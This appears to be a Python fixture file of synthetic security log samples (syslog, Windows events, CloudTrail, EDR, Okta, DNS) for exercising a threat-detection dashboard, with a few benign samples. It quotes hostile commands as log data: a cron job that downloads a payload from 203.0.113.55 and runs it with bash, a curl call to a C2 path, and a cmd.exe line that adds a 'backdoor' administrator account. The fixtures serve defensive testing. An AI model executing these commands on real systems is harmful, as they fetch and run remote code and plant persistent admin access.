"""Representative sample logs for the dashboard (from the furix reference set).
A spread of multi-stage attacks and benign traffic to exercise every agent."""

SAMPLE_LOGS = {
"syslog_multistage": """
May  6 08:12:01 web-srv01 sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
May  6 08:12:05 web-srv01 sshd[1234]: Failed password for invalid user root from 192.168.1.100 port 54323 ssh2
May  6 08:15:33 web-srv01 sudo[5678]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
May  6 08:16:01 web-srv01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.55 DST=10.0.0.1 PROTO=TCP DPT=445
May  6 08:18:22 web-srv01 kernel: CVE-2026-31431 privilege escalation attempt detected via kernel subsystem
May  6 08:20:01 web-srv01 cron[1111]: (root) CMD (/usr/bin/wget -q http://203.0.113.55/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh)
May  6 08:20:05 web-srv01 auditd[2222]: type=EXECVE msg=audit(1746504005.123:456): argc=3 a0="curl" a1="-s" a2="http://203.0.113.55/c2"
""".strip(),

"nmap": """
Nmap scan report for 172.16.40.50
Host is up (0.045s latency).
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9
443/tcp  open  https
| http-vuln-cve2024-21410:
|   VULNERABLE: Microsoft Exchange Server Elevation of Privilege Vulnerability
|     IDs:  CVE:CVE-2024-21410
3389/tcp open  ms-wbt-server Microsoft Terminal Services
445/tcp  open  microsoft-ds  Windows Server 2019
""".strip(),

"windows_evtx": """
EventID: 4625 | Account For Which Logon Failed: admin | Failure Reason: bad password | Source Network Address: 10.10.5.22 | Logon Type: 3
EventID: 4720 | A user account was created | New Account Name: backdoor_user | Created By: Administrator
EventID: 4732 | A member was added to a security-enabled local group | Group Name: Administrators | Member: backdoor_user
EventID: 7045 | A new service was installed | Service Name: EvilSvc | Service File: C:\\Windows\\Temp\\evil.exe
EventID: 4688 | A new process has been created | Process: C:\\Users\\victim\\AppData\\Local\\Temp\\mimikatz.exe | Creator: svchost.exe
""".strip(),

"aws_cloudtrail": """
{"eventName":"ConsoleLogin","eventSource":"signin.amazonaws.com","sourceIPAddress":"45.33.32.156","additionalEventData":{"MFAUsed":"No"},"responseElements":{"ConsoleLogin":"Success"}}
{"eventName":"DeleteBucket","eventSource":"s3.amazonaws.com","requestParameters":{"bucketName":"prod-backup-2024"},"sourceIPAddress":"45.33.32.156","userIdentity":{"userName":"contractor01"}}
{"eventName":"CreateUser","eventSource":"iam.amazonaws.com","requestParameters":{"userName":"backdoor_admin"},"sourceIPAddress":"45.33.32.156"}
{"eventName":"AttachUserPolicy","eventSource":"iam.amazonaws.com","requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"backdoor_admin"}}
{"eventName":"GetSecretValue","eventSource":"secretsmanager.amazonaws.com","requestParameters":{"secretId":"prod/db/password"},"sourceIPAddress":"45.33.32.156"}
""".strip(),

"suricata_ids": """
{"event_type":"alert","src_ip":"203.0.113.55","dest_ip":"10.0.0.5","dest_port":445,"alert":{"action":"blocked","signature":"ET EXPLOIT MS17-010 EternalBlue","category":"Exploit","severity":1}}
{"event_type":"alert","src_ip":"10.0.0.5","dest_ip":"203.0.113.55","dest_port":80,"alert":{"signature":"ET MALWARE CobaltStrike Beacon Checkin","category":"Malware Command and Control Activity Detected","severity":1}}
""".strip(),

"crowdstrike_edr": """
{"EventType":"ProcessRollup2","ComputerName":"WORKSTATION01","CommandLine":"cmd.exe /c whoami && net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add","ParentImageFileName":"svchost.exe"}
{"EventType":"NetworkConnect","RemoteAddressIP4":"203.0.113.55","RemotePort":4444,"Protocol":"TCP","ImageFileName":"beacon.exe","ComputerName":"WORKSTATION01"}
{"EventType":"DnsRequest","DomainName":"c2.malicious-domain.com","ImageFileName":"powershell.exe","ComputerName":"WORKSTATION01"}
""".strip(),

"okta_sso": """
{"eventType":"user.session.start","outcome":{"result":"SUCCESS"},"client":{"ipAddress":"45.33.32.156","geographicalContext":{"country":"Russia","city":"Moscow"},"userAgent":{"rawUserAgent":"python-requests/2.28.0"}},"actor":{"alternateId":"admin@corp.com"}}
{"eventType":"user.mfa.factor.deactivate","outcome":{"result":"SUCCESS"},"actor":{"alternateId":"admin@corp.com"},"target":[{"alternateId":"victim@corp.com"}]}
{"eventType":"user.account.privilege.grant","outcome":{"result":"SUCCESS"},"target":[{"alternateId":"backdoor@corp.com"}],"debugContext":{"debugData":{"privilegeGranted":"Super Administrator"}}}
""".strip(),

"dns_tunneling": """
06-May-2024 08:10:01 client 10.0.0.5#54321 (malware-c2.ru): query: malware-c2.ru IN A
06-May-2024 08:10:02 client 10.0.0.5#54322 (data-exfil.base64encoded.attacker.com): query: data-exfil.base64encoded.attacker.com IN TXT
""".strip(),

"benign_auth": """
May  6 09:00:01 corp-srv01 sshd[1234]: Accepted publickey for deploy from 10.0.0.50 port 22 ssh2
May  6 09:00:02 corp-srv01 sudo[5678]: deploy : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl restart nginx
May  6 09:10:00 corp-srv01 sshd[1236]: Disconnected from user deploy 10.0.0.50 port 22
""".strip(),

"benign_cloudtrail": """
{"eventName":"DescribeInstances","eventSource":"ec2.amazonaws.com","sourceIPAddress":"10.0.0.5","userIdentity":{"userName":"ops-engineer"}}
{"eventName":"GetObject","eventSource":"s3.amazonaws.com","requestParameters":{"bucketName":"corp-artifacts","key":"deployments/app-v2.1.tar.gz"},"userIdentity":{"userName":"deploy-bot"}}
""".strip(),
}
